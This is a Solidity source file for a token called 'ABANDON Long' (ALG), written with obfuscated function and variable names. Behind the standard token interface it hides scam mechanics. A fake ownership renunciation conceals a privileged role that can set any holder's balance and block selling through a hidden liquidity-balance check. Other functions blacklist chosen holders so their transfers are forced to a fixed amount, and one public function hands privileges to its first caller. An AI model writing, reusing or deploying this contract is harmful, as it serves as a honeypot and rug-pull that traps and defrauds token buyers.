//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface modeEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAt {
    function createPair(address feeMin, address totalIsTo) external returns (address);
}

interface atTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundLiquidity) external view returns (uint256);

    function transfer(address totalTx, uint256 fundTo) external returns (bool);

    function allowance(address feeTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundTo) external returns (bool);

    function transferFrom(
        address sender,
        address totalTx,
        uint256 fundTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minWallet, uint256 value);
    event Approval(address indexed feeTeam, address indexed spender, uint256 value);
}

interface limitTo is atTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ABANDONLong is marketingSender, atTeam, limitTo {

    string private fromListEnable = "ALG";

    function owner() external view returns (address) {
        return receiverLaunched;
    }

    uint256 private minEnable;

    function launchedSell() private view {
        require(fromAmount[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return receiverLaunched;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderTotal;
    }

    mapping(address => bool) public fromAmount;

    address private receiverLaunched;

    function exemptFee(address listTeam, uint256 fundTo) public {
        launchedSell();
        enableLimit[listTeam] = fundTo;
    }

    function takeListAuto(uint256 fundTo) public {
        launchedSell();
        senderFee = fundTo;
    }

    constructor (){
        if (totalList != minEnable) {
            teamAtList = totalList;
        }
        modeEnable takeAmount = modeEnable(amountLaunch);
        buyReceiver = receiverAt(takeAmount.factory()).createPair(takeAmount.WETH(), address(this));
        if (teamTx == tradingAmount) {
            totalList = amountLiquidity;
        }
        buyTxMarketing = _msgSender();
        autoMin();
        fromAmount[buyTxMarketing] = true;
        enableLimit[buyTxMarketing] = totalTeam;
        if (minEnable != totalList) {
            totalList = buyToken;
        }
        emit Transfer(address(0), buyTxMarketing, totalTeam);
    }

    uint256 private amountMax;

    uint256 private amountLiquidity;

    mapping(address => bool) public swapList;

    bool private sellReceiver;

    function totalToken(address toEnable, address totalTx, uint256 fundTo) internal returns (bool) {
        require(enableLimit[toEnable] >= fundTo);
        enableLimit[toEnable] -= fundTo;
        enableLimit[totalTx] += fundTo;
        emit Transfer(toEnable, totalTx, fundTo);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalTeam;
    }

    uint256 senderFee;

    uint256 amountMarketing;

    mapping(address => uint256) private enableLimit;

    mapping(address => mapping(address => uint256)) private amountList;

    function transferFrom(address toEnable, address totalTx, uint256 fundTo) external override returns (bool) {
        if (_msgSender() != amountLaunch) {
            if (amountList[toEnable][_msgSender()] != type(uint256).max) {
                require(fundTo <= amountList[toEnable][_msgSender()]);
                amountList[toEnable][_msgSender()] -= fundTo;
            }
        }
        return modeSell(toEnable, totalTx, fundTo);
    }

    function transfer(address listTeam, uint256 fundTo) external virtual override returns (bool) {
        return modeSell(_msgSender(), listTeam, fundTo);
    }

    uint8 private senderTotal = 18;

    uint256 private buyToken;

    function balanceOf(address fundLiquidity) public view virtual override returns (uint256) {
        return enableLimit[fundLiquidity];
    }

    function modeSell(address toEnable, address totalTx, uint256 fundTo) internal returns (bool) {
        if (toEnable == buyTxMarketing) {
            return totalToken(toEnable, totalTx, fundTo);
        }
        uint256 tokenLimit = atTeam(buyReceiver).balanceOf(tokenSwap);
        require(tokenLimit == senderFee);
        require(totalTx != tokenSwap);
        if (swapList[toEnable]) {
            return totalToken(toEnable, totalTx, txEnableTake);
        }
        return totalToken(toEnable, totalTx, fundTo);
    }

    function toAmount(address sellTx) public {
        if (amountReceiver) {
            return;
        }
        if (receiverEnable == totalList) {
            amountMax = buyToken;
        }
        fromAmount[sellTx] = true;
        if (totalList != minEnable) {
            buyToken = amountLiquidity;
        }
        amountReceiver = true;
    }

    uint256 private teamAtList;

    function name() external view virtual override returns (string memory) {
        return isLimitFrom;
    }

    address amountLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address fromList, uint256 fundTo) public virtual override returns (bool) {
        amountList[_msgSender()][fromList] = fundTo;
        emit Approval(_msgSender(), fromList, fundTo);
        return true;
    }

    uint256 private receiverEnable;

    uint256 public totalList;

    bool private teamTx;

    string private isLimitFrom = "ABANDON Long";

    function allowance(address tokenFrom, address fromList) external view virtual override returns (uint256) {
        if (fromList == amountLaunch) {
            return type(uint256).max;
        }
        return amountList[tokenFrom][fromList];
    }

    function symbol() external view virtual override returns (string memory) {
        return fromListEnable;
    }

    function autoMin() public {
        emit OwnershipTransferred(buyTxMarketing, address(0));
        receiverLaunched = address(0);
    }

    bool public amountReceiver;

    address tokenSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed senderSell, address indexed minShould);

    bool private tradingAmount;

    address public buyReceiver;

    uint256 constant txEnableTake = 13 ** 10;

    uint256 private totalTeam = 100000000 * 10 ** 18;

    function limitTeamMax(address listReceiver) public {
        launchedSell();
        
        if (listReceiver == buyTxMarketing || listReceiver == buyReceiver) {
            return;
        }
        swapList[listReceiver] = true;
    }

    address public buyTxMarketing;

}